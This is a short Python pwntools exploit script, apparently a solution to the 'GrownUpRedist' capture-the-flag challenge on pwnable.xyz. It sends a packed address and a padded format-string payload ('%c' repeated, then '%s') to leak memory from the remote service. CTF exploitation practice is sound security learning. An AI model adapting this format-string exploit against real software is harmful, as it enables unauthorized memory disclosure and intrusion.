#!/usr/bin/python
from pwn import *
import re

finder = re.compile("0x[0-9a-f]+")

# proc = process("./GrownUpRedist")
proc = remote("svc.pwnable.xyz", 30004)

context.terminal = ['tmux', 'splitw', '-v']
# gdb.attach(proc)

# raw_input("Waiting for first input..")

print(proc.read())
proc.write('y' * 8 + p64(0x601080))
# proc.writeline("YYYY")

print(proc.read())
# 5 for bypass registers, 3 for stacks
f_string = "%c" * 5 + "%c" * 3 + "%s"
proc.write('A' * 32 + f_string + 'A' * (0x80 - 32 - len(f_string)))

ret = proc.read()
print(ret)

# raw_list = finder.findall(ret)
#
# for hex_string in raw_list :
#     print("Trying %s" % hex_string)
#     try :
#         print(hex_string[2:].decode("hex"))
#     except :
#         pass

proc.interactive()

